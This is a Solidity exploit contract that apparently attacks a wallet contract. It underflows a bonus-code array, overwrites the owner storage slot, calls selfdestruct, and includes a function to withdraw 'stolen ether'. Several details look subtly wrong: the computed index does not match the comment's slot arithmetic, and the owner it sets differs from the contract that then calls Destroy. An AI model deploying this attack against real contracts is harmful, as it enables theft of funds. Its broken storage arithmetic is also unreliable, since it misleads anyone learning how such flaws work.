pragma solidity ^0.4.25;

interface IWallet {
    function PushBonusCode(uint c) external;
    function PopBonusCode() external;
    function UpdateBonusCodeAt(uint idx, uint c) external;
    function Destroy() external;
    function () external payable;
}

contract WalletExploit {
    IWallet public target;

    constructor(address _target) public {
        target = IWallet(_target);
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Send some ETH to perform the attack");

        // Step 1: Underflow the array
        target.PopBonusCode();

        // Step 2: Calculate index to overwrite slot 1 (owner)
        // bonusCodes is at slot 0, so slot 1 is idx = 2^256 - 1 (or -1)
        uint indexToOwnerSlot = uint(keccak256(uint(0))) + 1;

        // Step 3: Overwrite owner
        target.UpdateBonusCodeAt(indexToOwnerSlot, uint(msg.sender));

        // Step 4: Call selfdestruct
        target.Destroy();
    }

    // Withdraw stolen ether
    function collect() public {
        msg.sender.transfer(address(this).balance);
    }

    function () public payable {}
}

